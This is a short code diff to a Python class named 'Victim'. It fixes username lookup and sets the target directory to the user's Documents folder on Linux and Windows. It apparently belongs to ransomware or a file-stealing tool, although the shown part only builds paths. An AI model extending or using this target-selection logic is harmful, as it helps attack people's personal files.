@@ -16,7 +16,7 @@ class Victim:
 
     def get_username(self):
         if self.system == "Linux":
-            name = subprocess.run(["whoami"], capture_output=True, shell=True).stdout.decode("UTF-8").split("\n")
+            name = subprocess.run(["whoami"], capture_output=True, shell=True).stdout.decode("UTF-8").split("\n")[0]
             return name
         elif self.system == "Windows":
             name = subprocess.run(["echo", "%username%"], capture_output=True, shell=True).stdout.decode("UTF-8")\
@@ -25,6 +25,6 @@ class Victim:
 
     def get_target_dir(self):
         if self.system == "Linux":
-            return rf"\home\{self.username}"
+            return rf"/home/{self.username}/Documents"
         elif self.system == "Windows":
             return rf"C:\Users\{self.username}\Documents"
